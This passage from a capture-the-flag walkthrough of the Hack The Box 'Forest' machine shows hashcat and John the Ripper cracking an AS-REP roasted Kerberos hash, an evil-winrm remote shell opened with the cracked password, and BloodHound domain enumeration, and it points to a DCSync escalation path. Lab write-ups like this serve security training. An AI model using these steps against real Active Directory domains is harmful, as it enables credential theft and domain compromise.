ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

Host memory required for this attack: 1 MB

Dictionary cache built:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344392
* Bytes.....: 139921507
* Keyspace..: 14344385
* Runtime...: 1 sec

$krb5asrep$23$svc-alfresco@HTB.LOCAL:bd6dc292cf1b334b264e7395fae24749$feb8f3f05489dae2b4f2bdee81889f19191c211bf7304948671bfec6bd08c7f59b30e1b0b45d2692994b192a30bce0d6011bcdd809b0388cb104abae25b34c1714e8556aef891f4771d49b58fb2c9e57fb2d5c445eccb47133ba1810e9c4480cf0f2001e7c76de5e0d43a3c5bdbd086a226a69af2d0db92bc6c261d61771ebefb6e30e2445734b5512dbfc75b4166a6474220e5cfffbca7ed4e3d5393ccbcb705367492c19d4d27b4a8886918cf325a21e051fc48dbbbf9af3b0bf796e155d48a8759b77823d5ecd12f976aa12c29458b96fe329441586232397561b5cfaa7779a1438204470:s3rvice
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 18200 (Kerberos 5, etype 23, AS-REP)
Hash.Target......: $krb5asrep$23$svc-alfresco@HTB.LOCAL:bd6dc292cf1b33...204470
Time.Started.....: Wed Jan  1 09:16:45 2025 (2 secs)
Time.Estimated...: Wed Jan  1 09:16:47 2025 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#2.........:  1914.9 kH/s (0.88ms) @ Accel:512 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 4085760/14344385 (28.48%)
Rejected.........: 0/4085760 (0.00%)
Restore.Point....: 4083712/14344385 (28.47%)
Restore.Sub.#2...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#2....: s523480 -> s3r3ndipit

Started: Wed Jan  1 09:16:37 2025
Stopped: Wed Jan  1 09:16:48 2025
```

### John the Ripper

```bash
┌─[us-dedivip-1]─[10.10.14.63]─[lemagickonch@htb-pukfvgtk0k]─[~/Desktop]
└──╼ [★]$ john alfresco.hash --fork=4 -w=/usr/share/wordlists/rockyou.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 256/256 AVX2 8x])
Node numbers 1-4 of 4 (fork)
Press 'q' or Ctrl-C to abort, almost any other key for status
s3rvice          ($krb5asrep$23$svc-alfresco@HTB.LOCAL)     
4 1g 0:00:00:02 DONE (2025-01-01 09:19) 0.3831g/s 391350p/s 391350c/s 391350C/s s3urkf2m..s3rvice
3 0g 0:00:00:09 DONE (2025-01-01 09:19) 0g/s 391477p/s 391477c/s 391477C/sa6_123
2 0g 0:00:00:09 DONE (2025-01-01 09:19) 0g/s 391050p/s 391050c/s 391050C/s   tania.abygurl69
1 0g 0:00:00:09 DONE (2025-01-01 09:19) 0g/s 390200p/s 390200c/s 390200C/s    qaz.ie168
Waiting for 3 children to terminate
Session completed. 
```

## Evil-WinRM

Connect to the target using the user *svc-alfresco* and the creds we just cracked

```bash
┌─[us-dedivip-1]─[10.10.14.63]─[lemagickonch@htb-pukfvgtk0k]─[~/Desktop]
└──╼ [★]$ evil-winrm -i 10.129.200.84 -u svc-alfresco -p s3rvice
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents>
```

From here we can get the user flag located at *C:\Users\svc-alfresco\Desktop*

# **Privilege Escalation**

## Remote Bloodhound

Since we have credentials to a valid user we can run BloodHound on the domain to see if there are any easy paths to get further privs

```bash
┌─[us-dedivip-1]─[10.10.14.63]─[lemagickonch@htb-pukfvgtk0k]─[~/Desktop]
└──╼ [★]$ bloodhound-python -u svc-alfresco -p s3rvice -ns 10.129.200.84 -d htb.local -c All
INFO: Found AD domain: htb.local
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: [Errno Connection error (FOREST.htb.local:88)] [Errno -2] Name or service not known
INFO: Connecting to LDAP server: FOREST.htb.local
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 2 computers
INFO: Connecting to LDAP server: FOREST.htb.local
INFO: Found 33 users
INFO: Found 76 groups
INFO: Found 2 gpos
INFO: Found 15 ous
INFO: Found 20 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: EXCH01.htb.local
INFO: Querying computer: FOREST.htb.local
INFO: Done in 00M 04S
```

#### Start Bloodhound and Import the JSONs from the above command

Using the Built In Search *Shaortest Paths to High Value Targets* we get the below map

![image](https://github.com/user-attachments/assets/9dd5f142-a10b-46f8-abd9-b4f58fc0afa6)

From the map we see that *svc-alfresco* is a member of the *Account Operators* Group which enables us to create a user and put them into the local Administrators group and the *Exchange Windows Permissions* Group

The *Exchange Windows Permissions* groups has *WriteDACL* permissions over HTB.local meaning a user in this group can perform a DCSync Attack!!!

To see how to exploit a permission, *right-click* the edge and select *Help*

![image](https://github.com/user-attachments/assets/e302043c-13f0-48f0-9922-dc85459b6f06)

